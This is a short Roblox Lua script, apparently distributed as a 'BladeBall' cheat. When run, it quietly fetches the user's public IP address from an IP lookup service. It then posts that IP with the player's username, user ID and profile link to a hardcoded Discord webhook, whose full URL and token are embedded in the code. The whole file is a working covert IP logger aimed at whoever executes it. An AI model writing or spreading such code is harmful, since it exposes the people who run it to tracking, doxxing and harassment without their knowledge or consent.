local Response = request({
    Url = "https://api.ipify.org",
    Method = "GET"
})


local url = "https://discord.com/api/webhooks/1150572233211772969/5bpbAcMnFyXdmyfaxSJ0vju40fYdAWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
localusername = game.Players.LocalPlayer.Name
localuserid = game.Players.LocalPlayer.UserId
userinfo = Response.Body

    local data = {
        ["username"] = "bub",
        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(send)
